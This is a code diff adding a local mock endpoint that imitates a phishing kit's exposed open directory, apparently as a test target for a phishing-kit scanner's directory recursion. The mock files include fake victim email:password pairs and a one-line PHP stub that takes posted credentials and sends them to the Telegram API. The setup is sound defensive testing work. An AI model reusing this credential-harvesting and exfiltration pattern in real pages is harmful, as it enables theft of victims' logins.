@@ -504,6 +504,31 @@ async def demo_lead(page: str = ""):
     return HTMLResponse(_LEAD_PAGES.get(page.strip("/"), _LEAD_LANDING))
 
 
+# Detonate http://127.0.0.1:8090/demo-opendir/ — a sloppily-deployed kit with an EXPOSED open directory
+# whose files use NON-STANDARD names (results_x9f.txt, not results.txt) that the fixed probes miss. Only
+# the open-directory RECURSION finds them → recovers the victim credential log + kit source + a subdir.
+_OD_LISTING = ("<html><head><title>Index of /demo-opendir</title></head><body><h1>Index of /demo-opendir</h1><pre>"
+               "<a href='../'>Parent Directory</a>\n"
+               "<a href='results_x9f.txt'>results_x9f.txt</a>     4.1K\n"
+               "<a href='index.php'>index.php</a>               8.0K\n"
+               "<a href='sub/'>sub/</a>                     -\n</pre></body></html>")
+_OD_SUB = ("<html><head><title>Index of /demo-opendir/sub</title></head><body><h1>Index of /demo-opendir/sub</h1>"
+           "<pre><a href='../'>Parent Directory</a>\n<a href='panel_dump.log'>panel_dump.log</a>   2.0K\n</pre></body></html>")
+_OD_CREDS = "victim1@corp.com:Passw0rd!\nvictim2@corp.com:Hunter2!\nfinance@corp.com:Spring2024\n"
+_OD_SRC = "<?php $to=$_POST['email']; $pw=$_POST['pass']; file_get_contents('https://api.telegram.org/...'); ?>"
+_OD_PAGES = {"": _OD_LISTING, "results_x9f.txt": _OD_CREDS, "index.php": _OD_SRC,
+             "sub": _OD_SUB, "sub/": _OD_SUB, "sub/panel_dump.log": "admin@kit-panel.com:kitmaster99\n"}
+
+
+@app.api_route("/demo-opendir/{page:path}", methods=["GET", "POST"])
+async def demo_opendir(page: str = ""):
+    p = page.strip("/")
+    body = _OD_PAGES.get(p, _OD_LISTING)
+    if p and p != "sub":                       # files served as text/plain (creds/source), listings as HTML
+        return Response(body, media_type="text/plain")
+    return HTMLResponse(body)
+
+
 # ── built-in AiTM/reverse-proxy MOCK (safe) to test aitm.py end-to-end ────────────────────────────
 # Reproduces only the OBSERVABLE fingerprints of Evilginx/Modlishka (headers + cookies) — it does NOT
 # proxy anything, capture credentials, or make any outside connection. Detonate:
